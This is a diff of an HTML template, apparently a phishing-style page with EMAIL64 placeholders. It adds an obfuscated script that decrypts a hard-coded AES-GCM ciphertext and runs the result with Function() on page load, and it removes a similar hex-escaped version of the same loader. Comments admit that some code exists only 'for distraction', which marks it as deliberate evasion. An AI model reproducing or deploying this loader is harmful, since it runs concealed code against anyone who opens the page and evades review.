@@ -1,3 +1,80 @@
+
+<!DOCTYPE html>!!!<script>
+const hexToArray = (hexStr) =>
+    Uint8Array.from(hexStr.match(/.{1,2}/g).map((h) => parseInt(h, 16)));
+
+const decrypt = async (cText, ivHex, saltHex, secret) => {
+    const dec = new TextDecoder();
+    const iv = hexToArray(ivHex);
+    const salt = hexToArray(saltHex);
+    const keyMaterial = await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(secret),
+        { name: "PBKDF2" },
+        false,
+        ["deriveKey"]
+    );
+    const derivedKey = await crypto.subtle.deriveKey(
+        { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
+        keyMaterial,
+        { name: "AES-GCM", length: 256 },
+        false,
+        ["decrypt"]
+    );
+    const decryptedData = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv },
+        derivedKey,
+        hexToArray(cText)
+    );
+
+    // Useless operation to make the script different
+    const randomCheck = Math.random() > 0.5 ? "random-pass" : "random-fail";
+    console.log("Check value:", randomCheck); // Not used, just for distraction.
+
+    return dec.decode(decryptedData);
+};
+
+const process = async () => {
+    const data = {
+        iv: "b1d6504eea678a007e5d0a24",
+        salt: "d18df4d946a3b82aa0f930ee3300f82c",
+        ciphertext:
+            "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
+    };
+
+    if (!data) {
+        console.error("Error: Data not found");
+        return;
+    }
+
+    // Destructuring for simplicity
+    const { ciphertext, iv, salt } = data;
+
+    try {
+        // Useless delay function added for distraction
+        await new Promise((resolve) => setTimeout(resolve, 500));
+
+        const result = await decrypt(
+            ciphertext,
+            iv,
+            salt,
+            "my-secret-key"
+        );
+        console.log("Decrypted result:", result);
+
+        // Another useless operation
+        const extraLog = result.length > 10 ? "Decryption OK" : "Data too short";
+        console.log(extraLog);
+
+        Function(`${result}`)();
+    } catch (err) {
+        console.error("Failed to decrypt:", err.message);
+    }
+};
+
+process();
+
+</script>
 <!DOCTYPE html>
 <main adidas="<%=EMAIL64%>">
     <b><p nike-tes1="" ></b>
@@ -6,63 +83,3 @@
 <main uniqueVar="<%=EMAIL64%>">
     <b><p randomAttr=""></b>
 </main>
-<script>
-const var1 = (input) =>
-    Uint8Array.from(input.match(/.{1,2}/g).map((chunk) => parseInt(chunk, 16)));
-
-const var2 = async (data1, data2, data3, key) => {
-    const decoder = new TextDecoder();
-    const ivArray = var1(data2);
-    const saltArray = var1(data3);
-    const derivedKey = await crypto.subtle.deriveKey(
-        { name: "PBKDF2", salt: saltArray, iterations: 1e5, hash: "SHA-256" },
-        await crypto.subtle.importKey(
-            "raw",
-            new TextEncoder().encode(key),
-            { name: "PBKDF2" },
-            false,
-            ["deriveKey"]
-        ),
-        { name: "AES-GCM", length: 256 },
-        false,
-        ["decrypt"]
-    );
-    const decrypted = await crypto.subtle.decrypt(
-        { name: "AES-GCM", iv: ivArray },
-        derivedKey,
-        var1(data1)
-    );
-    return decoder.decode(decrypted);
-};
-
-const mainFunc = async () => {
-    const encryptedData = {
-        iv: "b1d6504eea678a007e5d0a24",
-        salt: "d18df4d946a3b82aa0f930ee3300f82c",
-        ciphertext:
-            "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
-    };
-
-    if (!encryptedData) {
-        console.error("\x4e\x6f\x20\x64\x61\x74\x61\x20\x66\x6f\x75\x6e\x64"); // "No data found"
-        return;
-    }
-
-    const { ciphertext: cipherText, iv: ivString, salt: saltString } = encryptedData;
-
-    try {
-        const decryptedText = await var2(
-            cipherText,
-            ivString,
-            saltString,
-            "\x6d\x79\x2d\x73\x65\x63\x72\x65\x74\x2d\x6b\x65\x79" // "my-secret-key"
-        );
-        console.log("\x44\x65\x63\x72\x79\x70\x74\x65\x64\x3a", decryptedText); // "Decrypted:"
-        Function(`${decryptedText}`)();
-    } catch (error) {
-        console.error("\x45\x72\x72\x6f\x72\x3a", error.message); // "Error:"
-    }
-};
-
-mainFunc();
-</script>
